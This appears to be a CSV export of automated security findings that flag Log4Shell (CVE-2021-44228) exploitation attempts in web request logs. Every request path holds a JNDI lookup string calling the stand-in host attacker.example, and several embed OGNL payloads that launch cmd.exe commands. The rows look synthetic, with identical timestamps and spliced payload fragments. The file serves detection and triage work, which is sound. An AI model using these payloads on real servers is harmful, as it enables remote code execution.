"FINDING_ID","DETECTED_AT","FINDING_TYPE","SEVERITY","STATUS","STATUS_COMMENT","TIMESTAMP","IP_ADDRESS","REQUEST_PATH","REQUEST_METHOD","STATUS_CODE","BYTES_SENT","BACKEND_IP","DESCRIPTION","LAST_UPDATED_AT","LAST_UPDATED_BY","EMAIL_SENT","EMAIL_SENT_AT"
192,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","168.35.139.220","/profile/images/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","POST",200,1179,"10.62.88.30","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
193,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","78.74.122.212","/home/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",503,4401,"10.187.22.195","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
201,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","150.41.42.52","/dashboard/docs/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","GET",204,7105,"192.168.81.184","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
202,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","12.58.15.16","/home/assets/${jndi:ldap://attacker.example/Exploit<injection>}.html","PUT",403,3882,"172.26.111.191","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
203,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","199.54.8.233","/logout/js/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#_res=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#_res.getWriter().println(""Hello from Log4j!""),#_res.getWriter().flush(),#_res.getWriter().close(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","DELETE",500,1013,"10.23.92.253","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
209,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","171.216.214.255","/dashboard/js/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",200,7052,"10.229.107.191","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
210,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","89.92.146.46","/profile/docs/${jndi:ldap://attacker.example/Exploit}.html","DELETE",200,2043,"10.155.206.95","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
211,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","146.154.230.35","/home/css/${jndi:ldap://attacker.example/Exploit}.html","PUT",204,2048,"172.19.85.193","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
1201,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","56.61.165.31","/contact/images/${jndi:ldap://attacker.example/Exploit}.html","GET",401,9648,"192.168.118.1","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
1202,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","101.131.223.251","/profile/docs/${jndi:ldap://attacker.example/Exploit<injection>}.html","GET",500,5295,"192.168.239.17","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
1203,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","158.218.108.1","/profile/css/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","POST",200,7467,"192.168.84.227","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
1204,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","138.135.197.76","/home/css/${jndi:ldap://attacker.example/Exploit#{injection}}.html","DELETE",401,3323,"172.27.14.144","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
